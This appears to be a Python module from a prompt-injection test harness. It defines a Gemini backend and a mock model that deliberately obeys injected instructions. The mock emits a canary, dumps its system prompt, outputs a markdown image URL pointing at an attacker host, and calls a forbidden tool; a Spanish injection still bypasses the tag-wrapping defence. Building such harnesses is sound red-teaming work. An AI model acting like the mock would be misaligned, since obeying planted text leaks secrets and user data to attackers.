"""LLM backends. `gemini` is the real target; `mock` is an offline stand-in used ONLY to test the
harness (its behaviour is hard-coded, so its results are not findings about any real model)."""
import os
import re
from .attacks import CANARY, SYSTEM_SECRET, ATTACKER_HOST, FORBIDDEN_TOOL


class GeminiLLM:
    name = "gemini"

    def __init__(self):
        from google import genai
        self.genai = genai
        self.client = genai.Client(api_key=os.environ["GEMINI_API_KEY"])
        self.model = os.environ.get("GEMINI_MODEL", "gemini-3.8-flash")

    def generate(self, system: str, user: str) -> str:
        from google.genai import types
        resp = self.client.models.generate_content(
            model=self.model,
            contents=user,
            config=types.GenerateContentConfig(system_instruction=system, temperature=0.0),
        )
        return resp.text or ""


class MockLLM:
    """Naive instruction follower. Obeys injected instructions unless the context is wrapped in
    <retrieved_document> tags; even then it still obeys the Spanish-language injection, so the
    results table shows a mix. Behaviour is arbitrary on purpose: it only exercises the harness."""
    name = "mock"

    def generate(self, system: str, user: str) -> str:
        defended = "<retrieved_document>" in user
        ctx = user.split("Question:")[0]
        first_sentence = re.split(r"(?<=[.!?])\s", re.sub(r"<[^>]+>", " ", ctx).strip().replace("Context:", "").strip())[0]
        out = first_sentence
        spanish = "Instruccion para el asistente" in ctx
        obey = (not defended) or spanish
        if obey and CANARY in ctx:
            out += f" {CANARY}"
        if obey and "print your full system instructions" in ctx:
            out += f" {system}"
        if obey and ATTACKER_HOST in ctx:
            out += f" ![audit](https://{ATTACKER_HOST}/c?d=x)"
        if obey and f"TOOL: {FORBIDDEN_TOOL}" in ctx:
            out = f"TOOL: {FORBIDDEN_TOOL}()\n" + out
        # utility: answer benign questions from the top chunk text
        q = user.split("Question:")[-1].lower()
        for fact, kw in (("24 days", "leave"), ("14 characters", "password"), ("Fridays after 3 pm", "deploy")):
            if kw in q and fact.lower() in ctx.lower():
                out += f" {fact}."
        return out


def get_llm(name: str):
    if name == "gemini":
        return GeminiLLM()
    if name == "mock":
        return MockLLM()
    raise ValueError(name)
